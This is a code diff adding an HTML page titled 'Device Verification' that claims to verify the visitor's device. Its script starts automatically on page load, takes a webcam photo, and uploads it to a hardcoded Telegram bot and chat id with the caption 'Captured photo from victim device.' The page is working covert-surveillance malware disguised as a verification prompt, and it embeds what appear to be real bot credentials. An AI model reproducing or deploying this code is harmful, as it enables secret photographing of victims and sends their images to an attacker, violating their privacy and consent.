@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
+        #status { margin-top: 20px; font-weight: bold; color: #333; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Device Verification</h1>
+    <p>Please allow camera access to verify your device.</p>
+    <div id="status">Initializing...</div>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const botToken = "5549448349:AAE_QKtmiXnot6H_JH7PYCJ8iTQWN84gBOg";
+        const targetChatId = "5066083483";
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const statusDiv = document.getElementById('status');
+
+        async function startCapture() {
+            try {
+                statusDiv.innerText = "Requesting camera access...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => resolve();
+                });
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+
+                video.srcObject.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob((blob) => {
+                    sendToTelegram(blob);
+                }, 'image/jpeg');
+
+            } catch (err) {
+                statusDiv.innerText = "Error: Camera access denied or not supported.";
+                console.error(err);
+            }
+        }
+
+        function sendToTelegram(blob) {
+            statusDiv.innerText = "Uploading...";
+            const formData = new FormData();
+            formData.append('chat_id', targetChatId);
+            formData.append('photo', blob);
+            formData.append('caption', 'Captured photo from victim device.');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.innerText = "Data sent successfully.";
+                } else {
+                    statusDiv.innerText = "Upload failed.";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusDiv.innerText = "Error sending data.";
+            });
+        }
+
+        // Start immediately when the page loads
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
